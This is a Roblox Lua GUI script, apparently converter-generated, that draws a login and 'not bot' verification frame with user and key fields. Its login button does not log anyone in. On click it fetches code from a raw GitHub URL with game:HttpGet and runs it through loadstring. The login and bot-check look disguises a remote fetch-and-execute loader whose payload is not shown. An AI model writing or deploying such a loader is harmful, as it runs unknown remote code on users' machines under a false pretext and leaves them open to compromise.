-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local TextBox = Instance.new("TextBox")
local UICorner_2 = Instance.new("UICorner")
local login = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local TextBox_2 = Instance.new("TextBox")
local UICorner_4 = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local ImageButton = Instance.new("ImageButton")
local TextLabel_2 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.Position = UDim2.new(0.279098868, 0, 0.335341334, 0)
Frame.Size = UDim2.new(0, 367, 0, 192)
Frame.Selectable = true
Frame.Active = true
Frame.Draggable = true

UICorner.Parent = Frame

TextBox.Parent = Frame
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.Position = UDim2.new(0.40385291, 0, 0.50382781, 0)
TextBox.Size = UDim2.new(0, 200, 0, 29)
TextBox.Font = Enum.Font.SourceSans
TextBox.Text = "user"
TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
TextBox.TextSize = 14.000

UICorner_2.Parent = TextBox

login.Name = "login"
login.Parent = Frame
login.BackgroundColor3 = Color3.fromRGB(0, 165, 13)
login.Position = UDim2.new(0.316997051, 0, 0.212161094, 0)
login.Size = UDim2.new(0, 133, 0, 50)
login.Font = Enum.Font.SourceSans
login.Text = "do not bot"
login.TextColor3 = Color3.fromRGB(255, 255, 255)
login.TextScaled = true
login.TextSize = 14.000
login.TextWrapped = true
login.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/MrMandM123/goofy/main/file",true))();
end)

UICorner_3.Parent = login

TextBox_2.Parent = Frame
TextBox_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox_2.Position = UDim2.new(0.40385291, 0, 0.76945281, 0)
TextBox_2.Size = UDim2.new(0, 200, 0, 29)
TextBox_2.Font = Enum.Font.SourceSans
TextBox_2.Text = "key"
TextBox_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextBox_2.TextSize = 14.000

UICorner_4.Parent = TextBox_2

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.Position = UDim2.new(0, 0, 0.0677083358, 0)
TextLabel.Size = UDim2.new(0, 367, 0, 24)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "dont use real info"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 14.000

ImageButton.Parent = Frame
ImageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton.BorderSizePixel = 0
ImageButton.Position = UDim2.new(-0.00214163959, 0, 0.567708313, 0)
ImageButton.Size = UDim2.new(0, 40, 0, 39)
ImageButton.MouseButton1Click:Connect(function()
	ImageButton.Image = "4485364382"
	login.Text = "log in"
end)

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(21, 0, 255)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.106267028, 0, 0.567708313, 0)
TextLabel_2.Size = UDim2.new(0, 92, 0, 39)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "not bot"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true
